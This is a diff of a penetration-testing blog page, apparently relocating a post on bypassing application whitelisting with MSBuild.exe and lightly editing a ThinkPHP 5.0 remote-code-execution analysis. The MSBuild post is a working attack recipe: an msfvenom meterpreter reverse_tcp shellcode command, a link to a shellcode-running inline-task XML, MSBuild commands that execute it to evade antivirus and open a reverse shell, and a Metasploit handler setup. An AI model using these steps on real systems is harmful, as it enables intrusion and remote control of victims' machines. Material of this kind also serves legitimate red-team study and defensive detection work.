@@ -252,157 +252,6 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/26/MSBuild.exe-bypass-application-whitelisting/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="pplsec">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/ppl.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="pplsec">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/03/26/MSBuild.exe-bypass-application-whitelisting/" itemprop="url">MSBuild.exe-bypass application whitelisting</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-03-26T22:38:36+08:00">
-                2019-03-26
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
-                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
-                    <span itemprop="name">渗透测试</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h3 id="1）通过msfvenom生成C＃的shellcode"><a href="#1）通过msfvenom生成C＃的shellcode" class="headerlink" title="1）通过msfvenom生成C＃的shellcode"></a>1）通过msfvenom生成C＃的shellcode</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=111.111.111.111 lport=4443 -f csharp</span><br></pre></td></tr></table></figure>
-<p><img src="/images/MSBuild.exe-bypass-application-whitelisting-1.png" alt=""></p>
-<h3 id="2）下载executes-20shellcode-xml，将上面生成的shellcode复制到该XML文件中"><a href="#2）下载executes-20shellcode-xml，将上面生成的shellcode复制到该XML文件中" class="headerlink" title="2）下载executes%20shellcode.xml，将上面生成的shellcode复制到该XML文件中"></a>2）下载executes%20shellcode.xml，将上面生成的shellcode复制到该XML文件中</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://raw.githubusercontent.com/3gstudent/msbuild-inline-task/master/executes%20shellcode.xml</span><br></pre></td></tr></table></figure>
-<p>注意:从C＃shellcode中替换shellcode值，然后将msfvenom 生成的shellcode中的buf重命名为shellcode<br><img src="/images/MSBuild.exe-bypass-application-whitelisting-2.png" alt=""></p>
-<h3 id="3）MSBuild-exe编译上面xml文件，执行shellcode-反弹shell"><a href="#3）MSBuild-exe编译上面xml文件，执行shellcode-反弹shell" class="headerlink" title="3）MSBuild.exe编译上面xml文件，执行shellcode 反弹shell"></a>3）MSBuild.exe编译上面xml文件，执行shellcode 反弹shell</h3><p>或者将上面xml文件后缀修改为.csproj (C#项目文件的扩展名) ，然后MSBuild.exe编译，同样可以执行shellcode 反弹shell</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe D:\test\mstest.xml</span><br><span class="line">或者</span><br><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe  D:\test\mstest.csproj</span><br></pre></td></tr></table></figure>
-<p><img src="/images/MSBuild.exe-bypass-application-whitelisting-3.png" alt=""><br>或者<br><img src="/images/MSBuild.exe-bypass-application-whitelisting-4.png" alt=""></p>
-<p>成功bypass av，反弹shell：<br><img src="/images/MSBuild.exe-bypass-application-whitelisting-5.png" alt=""></p>
-<h3 id="补充：MSF开启监听"><a href="#补充：MSF开启监听" class="headerlink" title="补充：MSF开启监听"></a>补充：MSF开启监听</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 172.16.0.19</span><br><span class="line">set LPORT 4443</span><br><span class="line">exploit -j</span><br></pre></td></tr></table></figure>
-<p><strong>参考:</strong><br><a href="https://www.hackingarticles.in/bypass-application-whitelisting-using-msbuild-exe-multiple-methods/" target="_blank" rel="noopener">https://www.hackingarticles.in/bypass-application-whitelisting-using-msbuild-exe-multiple-methods/</a> </p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/26/InstallUtil&csc.exe-bypass-application-whitelisting/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
@@ -554,6 +403,157 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/26/MSBuild.exe-bypass-application-whitelisting/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="pplsec">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/ppl.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="pplsec">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/03/26/MSBuild.exe-bypass-application-whitelisting/" itemprop="url">MSBuild.exe-bypass application whitelisting</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-03-26T22:38:36+08:00">
+                2019-03-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h3 id="1）通过msfvenom生成C＃的shellcode"><a href="#1）通过msfvenom生成C＃的shellcode" class="headerlink" title="1）通过msfvenom生成C＃的shellcode"></a>1）通过msfvenom生成C＃的shellcode</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=111.111.111.111 lport=4443 -f csharp</span><br></pre></td></tr></table></figure>
+<p><img src="/images/MSBuild.exe-bypass-application-whitelisting-1.png" alt=""></p>
+<h3 id="2）下载executes-20shellcode-xml，将上面生成的shellcode复制到该XML文件中"><a href="#2）下载executes-20shellcode-xml，将上面生成的shellcode复制到该XML文件中" class="headerlink" title="2）下载executes%20shellcode.xml，将上面生成的shellcode复制到该XML文件中"></a>2）下载executes%20shellcode.xml，将上面生成的shellcode复制到该XML文件中</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://raw.githubusercontent.com/3gstudent/msbuild-inline-task/master/executes%20shellcode.xml</span><br></pre></td></tr></table></figure>
+<p>注意:从C＃shellcode中替换shellcode值，然后将msfvenom 生成的shellcode中的buf重命名为shellcode<br><img src="/images/MSBuild.exe-bypass-application-whitelisting-2.png" alt=""></p>
+<h3 id="3）MSBuild-exe编译上面xml文件，执行shellcode-反弹shell"><a href="#3）MSBuild-exe编译上面xml文件，执行shellcode-反弹shell" class="headerlink" title="3）MSBuild.exe编译上面xml文件，执行shellcode 反弹shell"></a>3）MSBuild.exe编译上面xml文件，执行shellcode 反弹shell</h3><p>或者将上面xml文件后缀修改为.csproj (C#项目文件的扩展名) ，然后MSBuild.exe编译，同样可以执行shellcode 反弹shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe D:\test\mstest.xml</span><br><span class="line">或者</span><br><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe  D:\test\mstest.csproj</span><br></pre></td></tr></table></figure>
+<p><img src="/images/MSBuild.exe-bypass-application-whitelisting-3.png" alt=""><br>或者<br><img src="/images/MSBuild.exe-bypass-application-whitelisting-4.png" alt=""></p>
+<p>成功bypass av，反弹shell：<br><img src="/images/MSBuild.exe-bypass-application-whitelisting-5.png" alt=""></p>
+<h3 id="补充：MSF开启监听"><a href="#补充：MSF开启监听" class="headerlink" title="补充：MSF开启监听"></a>补充：MSF开启监听</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 172.16.0.19</span><br><span class="line">set LPORT 4443</span><br><span class="line">exploit -j</span><br></pre></td></tr></table></figure>
+<p><strong>参考:</strong><br><a href="https://www.hackingarticles.in/bypass-application-whitelisting-using-msbuild-exe-multiple-methods/" target="_blank" rel="noopener">https://www.hackingarticles.in/bypass-application-whitelisting-using-msbuild-exe-multiple-methods/</a> </p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/02/16/ThinkPHP5.0Request类远程命令执行漏洞20190111/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
@@ -655,10 +655,10 @@
 <h3 id="3-漏洞分析-ThinkPHP-5-0-15"><a href="#3-漏洞分析-ThinkPHP-5-0-15" class="headerlink" title="3)    漏洞分析(ThinkPHP 5.0.15)"></a>3)    漏洞分析(ThinkPHP 5.0.15)</h3><h4 id="github-commit信息"><a href="#github-commit信息" class="headerlink" title="github commit信息"></a>github commit信息</h4><p>首先看下官方github commit信息<br><a href="https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003?diff=split" target="_blank" rel="noopener">https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003?diff=split</a><br>library/think/Request.php的public function method($method = false)方法<br><img src="/images/ThinkPHP-RCE20190111-11.png" alt=""></p>
 <h4 id="静态代码分析"><a href="#静态代码分析" class="headerlink" title="静态代码分析"></a>静态代码分析</h4><p>以官网下载的ThinkPHP 5.0.15完整版进行分析，首先定位到漏洞关键点：<br>漏洞主要出现在Request 类的method 函数中<br>thinkphp5015\thinkphp/library/think/Request.php:501<br><img src="/images/ThinkPHP-RCE20190111-21.png" alt=""></p>
 <p>method()函数可以用来获取当前请求类型，如 GET、POST 等，当传入参数$method为false 的时候，会通过var_method 来配置$method</p>
-<p>508行method函数引入了一个外部可控的数据$_POST[Config::get[‘var_method’]。<br>在thinkphp5015\application\config.php中，可看到 ‘var_method’ 是表单请求伪变量，其默认值为 ‘_method’。<br><img src="/images/ThinkPHP-RCE20190111-22.png" alt=""></p>
+<p>508行method函数引入了一个外部可控的数据$_POST[Config::get[‘var_method’]。<br>在thinkphp5015\application\config.php中，可看到 ‘var_method’ 是表单请求伪变量，其默认值为 ‘_method’：<br><img src="/images/ThinkPHP-RCE20190111-22.png" alt=""></p>
 <p>取得$_POST[‘_method’]的值并将其赋值给$this-&gt;method，然后动态调用$this-&gt;{$this-&gt;method}($_POST)。这意味着攻击者可利用POST 参数可以实现对当前类的任意方法进行调用，通过调用当前类的构造方法可以实现任意覆盖成员属性的值。如果动态调用__construct构造函数，可以实现任意覆盖成员属性的值则会导致代码执行。</p>
-<p>在构造函数中，会判断其传入参数的key是否是该类属性，如果是，则将对应的value赋值给该属性，可以进行变量覆盖。<br><img src="/images/ThinkPHP-RCE20190111-23.png" alt=""> </p>
-<p>当<strong>method被赋值为</strong>construct之后，即$method参数为true 时，会通过server() 函数进入Request类的param()函数，进而input() &gt;&gt; getFilter() &gt;&gt; filterValue()<br>最终调用filterValue()中的回调函数call_user_func() 实现任意命令执行</p>
+<p>在构造函数中，会判断其传入参数的key是否是该类属性，如果是，则将对应的value赋值给该属性，可以进行变量覆盖：<br><img src="/images/ThinkPHP-RCE20190111-23.png" alt=""> </p>
+<p>当method被赋值为construct之后，即$method参数为true 时，会通过server() 函数进入Request类的param()函数，进而input() &gt;&gt; getFilter() &gt;&gt; filterValue()<br>最终调用filterValue()中的回调函数call_user_func() 实现任意命令执行</p>
 <p>当$method参数为true，进入server()：<br><img src="/images/ThinkPHP-RCE20190111-24.png" alt=""></p>
 <p>进入param()<br><img src="/images/ThinkPHP-RCE20190111-25.png" alt=""></p>
 <p>进入input() &gt;&gt; getFilter() &gt;&gt; filterValue()<br><img src="/images/ThinkPHP-RCE20190111-26.png" alt=""></p>
